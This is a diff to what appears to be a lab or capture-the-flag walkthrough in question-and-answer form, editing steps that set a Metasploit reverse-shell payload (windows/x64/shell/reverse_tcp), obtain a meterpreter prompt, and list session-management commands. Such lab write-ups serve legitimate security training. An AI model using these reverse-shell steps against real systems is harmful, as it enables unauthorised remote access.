@@ -74,10 +74,9 @@ Then enter the RHOST IP with:
 ### Q4: Then change the payload to the given:  no response required
 	set payload windows/x64/shell/reverse_tcp
 	
-### Q5: Then run and a meterpreter prompt appears.
+### Q5: Then run and a meterpreter prompt appears. Ensure meterpreter running no answer required.
 	
-	This states background using ctrl + Z, here is a summary of the important commands here:
-	Command	Does
+It worth noting you can set meterpreter state to background using ctrl + Z, here is a summary of commands related to session management:
 	ctrl+Z	            Background current session
 	sessions -l	        Lists current sessions running
 	sessions -I <ID>	  Interact with session <ID>
